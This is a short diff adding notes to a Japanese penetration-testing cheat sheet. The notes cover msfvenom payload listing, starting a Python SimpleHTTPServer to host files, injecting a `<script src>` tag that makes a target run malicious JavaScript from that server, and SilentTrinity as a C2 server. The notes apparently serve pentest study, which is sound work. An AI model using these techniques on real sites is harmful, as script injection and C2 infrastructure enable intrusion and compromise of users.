@@ -23,3 +23,14 @@
 ### msfvenom
 - metasploitのペイロードを取れる
 - ペイロードの列挙: `msfvenom -l payloads`
+
+
+## Reverse shells
+
+### SimpleHTTPserver
+- カレントディレクトリをルートとした簡易Webサーバを立てることができる．
+  - ```sudo python -m SimpleHTTPServer [port]```
+- 対象サーバで```<script src="http://.../a.js">```により任意の悪意のあるJavaScriptを実行させることなどが可能
+
+### SilentTrinity
+- C2 server を立てることができる
